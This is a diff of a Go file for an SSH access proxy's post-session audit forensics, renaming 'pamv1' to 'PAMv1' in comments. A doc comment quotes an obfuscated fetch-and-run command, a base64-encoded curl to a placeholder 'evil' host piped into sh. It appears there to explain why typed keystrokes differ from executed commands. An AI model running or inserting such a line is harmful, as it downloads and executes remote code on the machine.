@@ -5,7 +5,7 @@
 //
 // # The gap this closes, and why it is not eBPF
 //
-// pamv1 records every byte of an interactive SSH session (asciicast v2), but
+// PAMv1 records every byte of an interactive SSH session (asciicast v2), but
 // `internal/cmdguard`'s own doc comment states the boundary: an interactive PTY
 // is never parsed. A recording therefore shows what was TYPED, which is not the
 // same as what RAN. `echo Y3VybCAtcyBodHRwOi8vZXZpbA== | base64 -d | sh`
@@ -14,13 +14,13 @@
 // session's processes are its own children and a kernel probe sees every
 // execve.
 //
-// **pamv1 cannot do that, and the reason is architectural rather than a missing
-// dependency.** pamv1 is a proxy: an operator's shell runs on the TARGET, under
+// **PAMv1 cannot do that, and the reason is architectural rather than a missing
+// dependency.** PAMv1 is a proxy: an operator's shell runs on the TARGET, under
 // the target's sshd, in the target's kernel. Nothing an operator types is ever
 // executed on the pam-server host — there is no `os/exec` anywhere in the
 // session path — so an eBPF exec tracer attached on pam-server would observe
 // exactly zero events for every brokered session. Kernel-level in-session
-// tracing needs code inside the target's kernel; the only pamv1 code that ever
+// tracing needs code inside the target's kernel; the only PAMv1 code that ever
 // runs on a target is the Phase 153 endpoint agent, on opt-in endpoints only,
 // and even there it would need system-wide tracing plus a socket → sshd-child →
 // process-tree correlation, and a reporting path from agent to server that
@@ -33,7 +33,7 @@
 // The target's kernel already keeps the record: the Linux audit subsystem (the
 // same syscall hooks an eBPF probe would tap) writes an EXECVE record for every
 // exec, with the argv as executed — decoded, after any shell expansion or
-// base64 pipeline. So when a session ends, pamv1 runs ONE fixed, read-only
+// base64 pipeline. So when a session ends, PAMv1 runs ONE fixed, read-only
 // command over that target's own vaulted credential, on a FRESH connection
 // (never the live session — the same shape Phase 128's account discovery
 // established), filters the records to the session's own window, and attaches
@@ -56,7 +56,7 @@ import (
 	"time"
 )
 
-// Command is the single fixed, read-only command pamv1 runs on the target after
+// Command is the single fixed, read-only command PAMv1 runs on the target after
 // a session ends. It is deliberately not configurable: a remote command string
 // an operator could set is a policy hole, and this one runs with a privileged
 // vaulted credential (Phase 128 settled the same question the same way).
@@ -125,7 +125,7 @@ type Report struct {
 	// never guessing which mechanism produced it.
 	Source string `json:"source"`
 	// Target, Actor, SessionID and the window identify the session this
-	// reconstructs; they are pamv1's own facts, not the target's.
+	// reconstructs; they are PAMv1's own facts, not the target's.
 	Target    string    `json:"target"`
 	Actor     string    `json:"actor"`
 	SessionID string    `json:"session_id,omitempty"`
@@ -175,7 +175,7 @@ func Parse(raw string, start, end time.Time, maxEvents int) Report {
 		}
 		rep.Scanned++
 		// Inclusive window with a second of slack at each end: the audit clock is
-		// the target's and pamv1's is its own, and an exec at the very edge of a
+		// the target's and PAMv1's is its own, and an exec at the very edge of a
 		// session is exactly the one an investigator wants.
 		if ev.Time.Before(start.Add(-time.Second)) || ev.Time.After(end.Add(time.Second)) {
 			continue
@@ -414,7 +414,7 @@ func atoi(s string) int {
 // that nothing ran.
 func (r Report) Text() string {
 	var b strings.Builder
-	fmt.Fprintf(&b, "# pamv1 session forensics (%s)\n", r.Source)
+	fmt.Fprintf(&b, "# PAMv1 session forensics (%s)\n", r.Source)
 	fmt.Fprintf(&b, "# target: %s\n# actor: %s\n# session: %s\n# window: %s .. %s\n",
 		r.Target, r.Actor, r.SessionID, r.Started.Format(time.RFC3339), r.Ended.Format(time.RFC3339))
 	if r.Recording != "" {
